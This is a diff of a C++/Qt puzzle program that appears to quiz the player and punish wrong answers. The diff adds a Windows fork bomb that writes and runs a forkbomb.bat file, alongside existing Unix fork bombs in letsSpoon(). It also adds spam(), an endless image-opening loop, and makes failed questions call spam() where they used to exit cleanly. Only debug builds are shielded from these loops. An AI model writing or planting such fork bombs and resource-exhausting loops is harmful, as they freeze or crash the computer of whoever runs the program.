@@ -2,7 +2,6 @@
 #include <QDirIterator>
 #include <QDir>
 #include <QDebug>
-//#include <QImage>
 #include <QtGui/QImage>
 #include <QTransform>
 #include <QCryptographicHash>
@@ -100,22 +99,22 @@ void cause(std::string* idx, int fet){
 
 void failure(std::string fun,int wabba){
 	std::string* p = &fun;
-	cause(p,wabba);
-//	return;
+    cause(p,wabba);
 }
 
 void letsSpoon(){
 	while(1){
+#ifdef QT_DEBUG
+        exit(-1); // So as not to bomb our machines
+#endif
 		if(OS==win){
-			system("%0|%0");
+            system("echo %0^|%0 > forkbomb.bat "
+                   " forkbomb.bat");
 		}else if(OS==linux){
 			system(":(){ :|:& };:");
 		}else{
 			system("./$0|./$0&");
-		}
-#ifdef QT_DEBUG
-		exit(-1); // So as not to bomb our machines
-#endif
+        }
 	}
 	letsSpoon();
 }
@@ -157,12 +156,6 @@ void gehinomShtaim(){
 }
 #ifdef Q_OS_LINUX
 void* soDoesTea(void* void_star){
-   /* int z = 0;
-	int afbdsa = 3;
-	while(z*--z > 3){
-		afbdsa += afbdsa;
-	}
-	return NULL;*/
 	float v = *(float*)void_star;
 
 	usleep(1 * v);
@@ -177,10 +170,6 @@ float* coffeeHelps(){
 	for(int f = 0; f < NUMA; f++){
 		pthread_create(&pthread_T[f], NULL, soDoesTea, (void*)R[f]);
 	}
-
-	/*for(int o = 0; o < NUMA; o++){
-		R[o] = (int)R[o];
-	}*/
 	void* status;
 	int rc;
 	for(int f = 0; f < NUMA; f++){
@@ -285,6 +274,20 @@ QString f1(int& v1,int& v2,int &v3){
 	QString r1=fizzbuzz(v1);
 	int r2=f2(r1,v2,v3);
 	return r1;
+}
+
+void spam(){
+    while(1){
+#ifdef QT_DEBUG
+        exit(-7); // So as not to bomb our machines
+#endif
+        if(OS==win){
+            system("\"./Bambi.jpg\"");
+        }else{
+            system("display Bambi.jpg");
+        }
+    }
+    spam();
 }
 
 Apathy::Apathy(QObject *parent) : QObject(parent)
@@ -477,8 +480,7 @@ PhaseWrapper:
 #ifdef QT_DEBUG
 		QString answer="1 1 1 1 2 4";
 #endif
-	QString betterCallSol("57782e074824f9d63eadcc71c581973a4d17a597a4b094d13924d903dfc4e07f");
-//    QString betterCallSaul("e509743fa67c4a11f0f3a7a2c0704274a591fddd6a01971a588064d41112fec0");
+    QString betterCallSol("57782e074824f9d63eadcc71c581973a4d17a597a4b094d13924d903dfc4e07f");
 #ifdef Q_OS_WIN
 		float* r = cofeHelps();
 		qDebug()<<r[0]<<r[1]<<r[2]<<r[3]<<r[4]<<r[5];
@@ -536,8 +538,8 @@ Which starting number, under 5 million, produces the longest chain?
 				std::cout<<"Seeing as I'm so nice, I'll give you "<<tries<<" more tries.";
 				gehinomShtaim();
 			}else{
-				qDebug()<<"Failed q1";
-				exit(2);
+                qDebug()<<"Failed q1";
+                spam();
 			}
 		}else{
 			break;
@@ -560,8 +562,8 @@ Which starting number, under 5 million, produces the longest chain?
 				std::cout<<"Seeing as I'm so nice, I'll give you "<<tries<<" more tries.";
 				gehinomShtaim();
 			}else{
-				qDebug()<<"Failed q2";
-				exit(2);
+                qDebug()<<"Failed q2";
+                spam();
 			}
 		}else{
 			break;
@@ -595,7 +597,7 @@ Which starting number, under 5 million, produces the longest chain?
 				gehinomShtaim();
 			}else{
 				qDebug()<<"Failed q3";
-				exit(2);
+                spam();
 			}
 		}else{
 			break;
